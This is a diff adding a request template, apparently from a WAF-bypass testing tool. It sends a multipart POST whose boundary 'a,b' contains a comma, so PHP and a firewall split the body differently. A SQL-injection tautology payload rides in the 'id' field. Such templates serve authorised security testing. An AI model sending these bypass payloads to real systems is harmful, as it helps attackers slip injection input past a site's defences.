@@ -1,0 +1,19 @@
+# @name: multipart boundary含逗号
+# @tags: post,multipart,boundary,comma,php,id,bypass
+# @color: teal
+# @validate: baseline_similarity
+# @threshold: 0.92
+# @intent: multipart_boundary_comma
+# @intent.param: id
+# @intent.payload: id=1' and 'a'='a
+# @note: boundary=a,b 中 boundary 遇逗号即结束，PHP 实际使用 a 作为 boundary，而 WAF 可能取 a,b 或解析失败，造成 part 切分不一致。参考 do9gy multipart Part1 第10条。
+POST / HTTP/1.1
+Host: {{TARGET_HOST_HEADER}}
+User-Agent: {{USER_AGENT}}
+Content-Type: multipart/form-data; boundary=a,b
+
+--a
+Content-Disposition: form-data; name="id"
+
+1' and 'a'='a
+--a--
